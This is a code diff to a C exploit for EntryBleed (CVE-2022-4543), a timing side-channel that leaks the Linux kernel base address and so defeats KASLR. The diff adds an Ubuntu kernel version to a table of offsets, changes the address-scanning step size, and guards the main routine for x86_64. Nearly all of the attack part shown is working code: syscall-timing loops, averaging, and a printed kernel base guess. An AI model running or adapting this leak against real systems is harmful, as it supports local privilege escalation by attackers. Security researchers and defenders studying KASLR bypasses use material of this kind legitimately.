@@ -183,6 +183,7 @@ struct kernel_info offsets[] = {
     {"5.15.0-53-lowlatency #59-Ubuntu SMP PREEMPT Thu Oct 20 12:38:19 UTC 2022",                   0xe00000, 0x1200000},
     {"5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022",                              0xe00000, 0x1200000},
     {"5.15.0-56-lowlatency #62-Ubuntu SMP PREEMPT Wed Nov 23 09:50:07 UTC 2022",                   0xe00000, 0x1200000},
+    {"5.15.0-57-generic #63-Ubuntu SMP Thu Nov 24 13:43:17 UTC 2022",                              0xe00000, 0x1200000},
 
     // openSUSE Leap 15
     {"4.12.14-lp151.28.10-default #1 SMP Sat Jul 13 17:59:31 UTC 2019 (0ab03b7)",                  0x800000, 0xc00000},
@@ -311,7 +312,8 @@ uint64_t sidechannel(uint64_t addr) {
   return c - a;
 }
 
-#define ARR_SIZE (KERNEL_BASE_MAX - KERNEL_BASE_MIN) / KERNEL_ALIGN
+#define STEP 0x100000ul
+#define ARR_SIZE (KERNEL_BASE_MAX - KERNEL_BASE_MIN) / STEP
 
 uint64_t leak_syscall_entry(uint64_t offset) {
   uint64_t data[ARR_SIZE] = {0};
@@ -324,7 +326,7 @@ uint64_t leak_syscall_entry(uint64_t offset) {
   uint64_t idx;
   for (i = 0; i < iterations + dummy_iterations; i++) {
     for (idx = 0; idx < ARR_SIZE; idx++) {
-      uint64_t test = SCAN_START + idx * KERNEL_ALIGN;
+      uint64_t test = SCAN_START + idx * STEP;
       syscall(104);
       uint64_t time = sidechannel(test);
       if (i >= dummy_iterations)
@@ -336,9 +338,9 @@ uint64_t leak_syscall_entry(uint64_t offset) {
     data[i] /= iterations;
     if (data[i] < min) {
       min = data[i];
-      addr = SCAN_START + i * KERNEL_ALIGN;
+      addr = SCAN_START + i * STEP;
     }
-    // printf("%llx %ld\n", (SCAN_START + i * KERNEL_ALIGN), data[i]);
+    // printf("%llx %ld\n", (SCAN_START + i * STEP), data[i]);
   }
 
   if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
@@ -391,6 +393,7 @@ unsigned long get_kernel_addr_entrybleed() {
 }
 
 int main(int argc, char **argv) {
+#if defined(__x86_64__) || defined(__amd64__)
   printf("[.] trying EntryBleed (CVE-2022-4543) ...\n");
 
   unsigned long addr = get_kernel_addr_entrybleed();
@@ -398,6 +401,6 @@ int main(int argc, char **argv) {
     return 1;
 
   printf("possible kernel base: %lx\n", addr);
-
+#endif
   return 0;
 }
